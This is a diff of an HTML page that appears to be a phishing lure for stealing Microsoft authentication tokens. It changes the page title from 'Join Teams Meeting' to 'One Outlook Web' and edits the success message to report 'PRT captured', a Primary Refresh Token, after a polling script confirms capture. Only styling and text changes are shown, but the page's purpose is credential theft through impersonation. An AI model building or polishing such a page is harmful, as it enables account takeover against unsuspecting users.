@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Join Teams Meeting</title>
+    <title>One Outlook Web</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -70,7 +70,6 @@
         .success { background: #d4edda; color: #155724; }
         .steps { text-align: left; margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 10px; font-size: 12px; }
         .steps ol { padding-left: 20px; margin-top: 5px; }
-        .steps li { margin: 5px 0; }
     </style>
 </head>
 <body>
@@ -91,7 +90,7 @@
         </ol>
     </div>
     <div class="status" id="statusMsg">
-        <span class="spinner"></span> Ready to authenticate...
+        <span class="spinner"></span> Ready...
     </div>
 </div>
 
@@ -132,7 +131,7 @@
                 
                 if (data.status === 'success') {
                     clearInterval(pollInterval);
-                    document.getElementById('statusMsg').innerHTML = '✅ Authentication successful! Session captured.';
+                    document.getElementById('statusMsg').innerHTML = '✅ Authentication successful! PRT captured.';
                     document.getElementById('statusMsg').classList.add('success');
                     setTimeout(() => window.close(), 2000);
                 }
